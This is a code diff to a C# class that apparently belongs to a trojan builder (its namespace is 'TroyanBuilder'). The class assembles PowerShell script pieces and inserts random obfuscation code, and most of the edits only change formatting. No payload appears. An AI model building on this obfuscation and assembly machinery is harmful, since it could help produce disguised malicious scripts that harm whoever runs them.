@@ -1,6 +1,6 @@
 using System.Text;
 
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 public partial class CustomBuilder
 {
@@ -31,12 +31,12 @@ public partial class CustomBuilder
 
     protected virtual List<SourceFile> GetSourceFiles()
     {
-        var files =Directory.GetFiles(SourceDir)
+        var files = Directory.GetFiles(SourceDir)
             .Select(Path.GetFileNameWithoutExtension)
-            .ToArray().Except(new[] { "program","header","footer","dynamic" })!
+            .ToArray().Except(new[] { "program", "header", "footer", "dynamic" })!
             .SortWithPriority(PriorityTasks, UnpriorityTasks)
             .ToList();
-        return files.Select(a=> new SourceFile(a,this)).ToList();
+        return files.Select(a => new SourceFile(a, this)).ToList();
     }
 
     private Dictionary<string, SourceFile> CachedSourceFiles { get; set; } = new Dictionary<string, SourceFile>();
@@ -65,7 +65,7 @@ public partial class CustomBuilder
         while (!File.Exists(path))
         {
             path = Path.Combine(dir, sourceFile + ".ps1");
-            dir = Path.Combine(dir,"..");
+            dir = Path.Combine(dir, "..");
         }
 
         var lines = File.ReadAllLines(path).ToList();
@@ -109,7 +109,7 @@ public partial class CustomBuilder
 
         sb.AppendLine("");
 
-        var data=sb.ToString();
+        var data = sb.ToString();
         result.IsDo = data.Contains($"function do_{sourceFile}");
         if (result.IsDo)
         {
@@ -142,7 +142,7 @@ public partial class CustomBuilder
             {
                 var ddata = ReadSource("dynamic").Data;
                 result.Data = result.Data.Replace("###dynamic", ddata, StringComparison.Ordinal);
-                result.Data = result.Data.Replace("###random", new PowerShellObfuscator().RandomCode(), StringComparison.Ordinal);
+                result.Data = result.Data.Replace("###random", _obfuscator.RandomCode(), StringComparison.Ordinal);
             }
         }
 
